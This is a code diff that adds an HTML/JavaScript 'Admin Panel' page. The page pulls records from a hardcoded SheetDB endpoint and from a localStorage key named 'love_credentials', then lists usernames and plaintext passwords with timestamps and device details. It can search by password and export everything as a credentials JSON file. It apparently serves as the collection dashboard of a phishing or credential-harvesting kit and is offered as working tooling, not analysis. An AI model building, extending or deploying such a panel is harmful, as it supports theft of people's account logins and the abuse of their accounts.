@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Cloud Sync</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 2rem;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            color: white;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 3px solid #fff;
+            font-size: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        
+        .tab {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            cursor: pointer;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            background: white;
+            color: #764ba2;
+        }
+        
+        .tab:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        
+        .refresh-btn {
+            background: #ff3366;
+            color: white;
+            border: none;
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .refresh-btn:hover {
+            background: #ff1a4f;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 51, 102, 0.3);
+        }
+
+        .export-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .export-btn:hover {
+            background: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
+        }
+
+        .clear-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .clear-btn:hover {
+            background: #c82333;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 40px;
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        .search-box:focus {
+            border-color: #ff3366;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(255, 51, 102, 0.1);
+        }
+
+        .api-status {
+            background: #e8f5e9;
+            padding: 1rem 1.5rem;
+            border-radius: 40px;
+            margin-bottom: 1rem;
+            color: #2e7d32;
+            text-align: center;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .error-status {
+            background: #ffebee;
+            color: #c62828;
+            padding: 1rem 1.5rem;
+            border-radius: 40px;
+            margin-bottom: 1rem;
+            text-align: center;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .credentials-list {
+            background: white;
+            padding: 2rem;
+            border-radius: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            min-height: 400px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+
+        .stats-card {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 20px;
+            margin-bottom: 2rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            text-align: center;
+        }
+
+        .stat-item {
+            background: rgba(255,255,255,0.2);
+            padding: 1rem;
+            border-radius: 15px;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 0.3rem;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        .credential-item {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 20px;
+            margin-bottom: 1rem;
+            border-left: 6px solid #ff3366;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.08);
+            transition: all 0.3s;
+        }
+
+        .credential-item:hover {
+            transform: translateX(8px);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+        }
+
+        .credential-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .username {
+            color: #004d73;
+            font-weight: 700;
+            font-size: 1.3rem;
+            background: #e3f2fd;
+            padding: 0.3rem 1.2rem;
+            border-radius: 40px;
+            display: inline-block;
+        }
+
+        .password {
+            color: #c0392b;
+            font-weight: 700;
+            font-size: 1.3rem;
+            background: #ffebee;
+            padding: 0.3rem 1.2rem;
+            border-radius: 40px;
+            display: inline-block;
+        }
+
+        .credential-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 2px dashed #e0e0e0;
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+            font-size: 0.95rem;
+        }
+
+        .detail-item i {
+            color: #ff3366;
+            width: 20px;
+        }
+
+        .device-info {
+            color: #888;
+            font-size: 0.85rem;
+            word-break: break-all;
+            background: #f1f3f4;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            margin-top: 0.8rem;
+        }
+
+        .no-data {
+            text-align: center;
+            color: #666;
+            padding: 4rem 2rem;
+            font-size: 1.2rem;
+        }
+
+        .no-data i {
+            font-size: 4rem;
+            color: #ff3366;
+            margin-bottom: 1rem;
+            opacity: 0.5;
+        }
+
+        .loading {
+            text-align: center;
+            color: #666;
+            padding: 3rem;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff3366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .test-connection-btn {
+            background: #ffc107;
+            color: #333;
+            border: none;
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .test-connection-btn:hover {
+            background: #e0a800;
+            transform: translateY(-2px);
+        }
+
+        .raw-data-btn {
+            background: #17a2b8;
+            color: white;
+            border: none;
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .raw-data-btn:hover {
+            background: #138496;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            <i class="fas fa-cloud-upload-alt"></i>
+            Admin Panel - Cloud Synced
+        </h1>
+        
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('cloud')">
+                <i class="fas fa-cloud"></i> Cloud Data (SheetDB)
+            </button>
+            <button class="tab" onclick="switchTab('local')">
+                <i class="fas fa-database"></i> Local Backup
+            </button>
+            <button class="tab" onclick="switchTab('stats')">
+                <i class="fas fa-chart-bar"></i> Statistics
+            </button>
+        </div>
+        
+        <div class="button-group">
+            <button class="refresh-btn" onclick="refreshCurrentTab()">
+                <i class="fas fa-sync-alt"></i> Refresh
+            </button>
+            <button class="export-btn" onclick="exportData()">
+                <i class="fas fa-download"></i> Export JSON
+            </button>
+            <button class="clear-btn" onclick="clearAllData()">
+                <i class="fas fa-trash-alt"></i> Clear All
+            </button>
+            <button class="test-connection-btn" onclick="testConnection()">
+                <i class="fas fa-plug"></i> Test Connection
+            </button>
+            <button class="raw-data-btn" onclick="viewRawData()">
+                <i class="fas fa-code"></i> View Raw Data
+            </button>
+        </div>
+        
+        <input type="text" class="search-box" id="searchInput" 
+               placeholder="🔍 Search by username or password..." 
+               onkeyup="filterData()">
+        
+        <div id="apiStatus" class="api-status">
+            <i class="fas fa-info-circle"></i>
+            Ready to connect to SheetDB
+        </div>
+        
+        <div class="credentials-list" id="credentialsList">
+            <div class="loading">
+                <div class="spinner"></div>
+                <div>Loading data...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Your SheetDB URL - VERIFY THIS IS CORRECT
+        const SHEETDB_URL = 'https://sheetdb.io/api/v1/b5wwfyhwzpf9z';
+        const STORAGE_KEY = 'love_credentials';
+        
+        let currentTab = 'cloud';
+        let allCloudData = [];
+        let allLocalData = [];
+
+        // Test connection function
+        async function testConnection() {
+            const statusDiv = document.getElementById('apiStatus');
+            statusDiv.className = 'api-status';
+            statusDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Testing connection...';
+            
+            try {
+                const response = await fetch(SHEETDB_URL);
+                if (response.ok) {
+                    statusDiv.className = 'api-status';
+                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Connection successful! URL is working.';
+                } else {
+                    throw new Error(`Status: ${response.status}`);
+                }
+            } catch (error) {
+                statusDiv.className = 'error-status';
+                statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Connection failed: ${error.message}`;
+            }
+        }
+
+        // View raw data function
+        async function viewRawData() {
+            try {
+                const response = await fetch(SHEETDB_URL);
+                const data = await response.json();
+                alert(JSON.stringify(data, null, 2));
+                console.log('Raw data:', data);
+            } catch (error) {
+                alert('Error fetching data: ' + error.message);
+            }
+        }
+
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            if (tab === 'cloud') {
+                loadFromCloud();
+            } else if (tab === 'local') {
+                loadFromLocal();
+            } else if (tab === 'stats') {
+                showStatistics();
+            }
+        }
+
+        function refreshCurrentTab() {
+            if (currentTab === 'cloud') {
+                loadFromCloud();
+            } else if (currentTab === 'local') {
+                loadFromLocal();
+            } else if (currentTab === 'stats') {
+                showStatistics();
+            }
+        }
+
+        async function loadFromCloud() {
+            const credentialsList = document.getElementById('credentialsList');
+            const statusDiv = document.getElementById('apiStatus');
+            
+            credentialsList.innerHTML = '<div class="loading"><div class="spinner"></div><div>Fetching from cloud...</div></div>';
+            statusDiv.className = 'api-status';
+            statusDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting to SheetDB...';
+            
+            try {
+                const response = await fetch(SHEETDB_URL);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                console.log('Raw data from SheetDB:', data); // Debug log
+                
+                // Store the data
+                allCloudData = data;
+                
+                if (!data || data.length === 0) {
+                    credentialsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i><br>📭 No credentials in cloud yet</div>';
+                    statusDiv.className = 'api-status';
+                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Connected to SheetDB - No data yet';
+                    return;
+                }
+                
+                displayData(data, 'cloud');
+                statusDiv.className = 'api-status';
+                statusDiv.innerHTML = `<i class="fas fa-check-circle"></i> Connected to SheetDB - Last updated: ${new Date().toLocaleTimeString()} | Total: ${data.length} entries`;
+                
+            } catch (error) {
+                console.error('Error fetching from cloud:', error);
+                credentialsList.innerHTML = `
+                    <div class="no-data">
+                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #ff3366;"></i><br>
+                        ❌ Error loading from cloud: ${error.message}<br><br>
+                        <button class="refresh-btn" onclick="loadFromLocal()">
+                            <i class="fas fa-database"></i> View Local Backup Instead
+                        </button>
+                        <br><br>
+                        <button class="test-connection-btn" onclick="testConnection()">
+                            <i class="fas fa-plug"></i> Test Connection
+                        </button>
+                    </div>
+                `;
+                statusDiv.className = 'error-status';
+                statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Connection error: ${error.message}. Make sure your SheetDB URL is correct.`;
+            }
+        }
+
+        function loadFromLocal() {
+            const credentialsList = document.getElementById('credentialsList');
+            const statusDiv = document.getElementById('apiStatus');
+            
+            try {
+                const stored = localStorage.getItem(STORAGE_KEY);
+                let credentials = [];
+                
+                if (stored) {
+                    credentials = JSON.parse(stored);
+                }
+                allLocalData = credentials;
+                
+                if (credentials.length === 0) {
+                    credentialsList.innerHTML = '<div class="no-data"><i class="fas fa-database"></i><br>📭 No local backup data found</div>';
+                    statusDiv.className = 'api-status';
+                    statusDiv.innerHTML = '<i class="fas fa-info-circle"></i> Showing local backup - No data';
+                    return;
+                }
+                
+                displayData(credentials, 'local');
+                statusDiv.className = 'api-status';
+                statusDiv.innerHTML = `<i class="fas fa-check-circle"></i> Showing local backup - Total: ${credentials.length} entries`;
+                
+            } catch (error) {
+                credentialsList.innerHTML = '<div class="no-data">Error loading local data</div>';
+            }
+        }
+
+        function displayData(data, source) {
+            const credentialsList = document.getElementById('credentialsList');
+            
+            // Check if data is array
+            if (!Array.isArray(data)) {
+                console.error('Data is not an array:', data);
+                credentialsList.innerHTML = '<div class="no-data">Invalid data format received</div>';
+                return;
+            }
+
+            let html = `<div class="stats-card">`;
+            html += `
+                <div class="stat-item">
+                    <div class="stat-value">${data.length}</div>
+                    <div class="stat-label">Total Entries</div>
+                </div>
+            `;
+            
+            // Count unique usernames
+            const uniqueUsers = new Set();
+            data.forEach(item => {
+                if (item.username || item.id) uniqueUsers.add(item.username || item.id);
+            });
+            
+            html += `
+                <div class="stat-item">
+                    <div class="stat-value">${uniqueUsers.size}</div>
+                    <div class="stat-label">Unique Users</div>
+                </div>
+            `;
+            html += `</div>`;
+            
+            // Display each entry
+            data.reverse().forEach((entry, index) => {
+                // Handle both 'username' and 'id' fields
+                const username = entry.username || entry.id || 'N/A';
+                const password = entry.password || 'N/A';
+                const timestamp = entry.timestamp || 'Unknown';
+                const device = entry.device || 'Not available';
+                
+                html += `
+                    <div class="credential-item" data-index="${index}">
+                        <div class="credential-header">
+                            <span class="username">
+                                <i class="fas fa-user"></i> ${username}
+                            </span>
+                            <span class="password">
+                                <i class="fas fa-lock"></i> ${password}
+                            </span>
+                        </div>
+                        <div class="credential-details">
+                            <div class="detail-item">
+                                <i class="far fa-calendar-alt"></i>
+                                <span>${timestamp}</span>
+                            </div>
+                        </div>
+                        <div class="device-info">
+                            <i class="fas fa-mobile-alt"></i> ${device.substring(0, 100)}${device.length > 100 ? '...' : ''}
+                        </div>
+                    </div>
+                `;
+            });
+            
+            credentialsList.innerHTML = html;
+        }
+
+        function showStatistics() {
+            const credentialsList = document.getElementById('credentialsList');
+            const statusDiv = document.getElementById('apiStatus');
+            
+            const cloudCount = allCloudData.length;
+            const localCount = allLocalData.length;
+            
+            // Get unique usernames from cloud
+            const uniqueUsernames = new Set();
+            allCloudData.forEach(entry => {
+                const username = entry.username || entry.id;
+                if (username) uniqueUsernames.add(username);
+            });
+            
+            // Get latest entry
+            let latestEntry = 'No data';
+            if (allCloudData.length > 0) {
+                const latest = allCloudData[0];
+                latestEntry = `${latest.username || latest.id || 'Unknown'} - ${latest.timestamp || 'Unknown'}`;
+            }
+            
+            let html = `
+                <div class="stats-card">
+                    <div class="stat-item">
+                        <div class="stat-value">${cloudCount}</div>
+                        <div class="stat-label">Cloud Entries</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">${localCount}</div>
+                        <div class="stat-label">Local Entries</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">${uniqueUsernames.size}</div>
+                        <div class="stat-label">Unique Users</div>
+                    </div>
+                </div>
+            `;
+            
+            html += '<div style="background: white; padding: 2rem; border-radius: 20px;">';
+            html += '<h3 style="margin-bottom: 1.5rem; color: #333;">📋 Recent Activity</h3>';
+            
+            if (allCloudData.length > 0) {
+                const recent = allCloudData.slice(0, 5);
+                recent.forEach((entry, i) => {
+                    const username = entry.username || entry.id || 'Unknown';
+                    const timestamp = entry.timestamp || 'Unknown';
+                    html += `
+                        <div style="background: #f8f9fa; padding: 1rem; margin-bottom: 0.8rem; border-radius: 10px; border-left: 3px solid #ff3366;">
+                            <strong>${username}</strong> - ${timestamp}
+                        </div>
+                    `;
+                });
+            } else {
+                html += '<p class="no-data">No recent activity</p>';
+            }
+            
+            html += '</div>';
+            credentialsList.innerHTML = html;
+            statusDiv.className = 'api-status';
+            statusDiv.innerHTML = '<i class="fas fa-chart-bar"></i> Statistics view';
+        }
+
+        function filterData() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            
+            if (currentTab === 'cloud') {
+                const filtered = allCloudData.filter(entry => {
+                    const username = (entry.username || entry.id || '').toLowerCase();
+                    const password = (entry.password || '').toLowerCase();
+                    return username.includes(searchTerm) || password.includes(searchTerm);
+                });
+                displayData(filtered, 'cloud');
+            } else if (currentTab === 'local') {
+                const filtered = allLocalData.filter(entry => {
+                    const username = (entry.username || entry.id || '').toLowerCase();
+                    const password = (entry.password || '').toLowerCase();
+                    return username.includes(searchTerm) || password.includes(searchTerm);
+                });
+                displayData(filtered, 'local');
+            }
+        }
+
+        function exportData() {
+            const data = currentTab === 'cloud' ? allCloudData : allLocalData;
+            const dataStr = JSON.stringify(data, null, 2);
+            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+            
+            const exportFileDefaultName = `credentials_${new Date().toISOString().slice(0,10)}.json`;
+            
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', exportFileDefaultName);
+            linkElement.click();
+        }
+
+        async function clearAllData() {
+            if (!confirm('⚠️ Are you sure you want to clear ALL data? This cannot be undone!')) {
+                return;
+            }
+            
+            try {
+                // Clear local storage
+                localStorage.removeItem(STORAGE_KEY);
+                
+                // Note: SheetDB clear would require DELETE request
+                alert('Local data cleared. To clear cloud data, please delete rows from your Google Sheet manually.');
+                
+                // Refresh current view
+                refreshCurrentTab();
+                
+            } catch (error) {
+                alert('Error clearing data: ' + error.message);
+            }
+        }
+
+        // Load cloud data by default when page opens
+        window.onload = () => {
+            loadFromCloud();
+            // Also load local data for stats
+            const stored = localStorage.getItem(STORAGE_KEY);
+            if (stored) {
+                try {
+                    allLocalData = JSON.parse(stored);
+                } catch (e) {
+                    allLocalData = [];
+                }
+            }
+        };
+    </script>
+</body>
+</html>
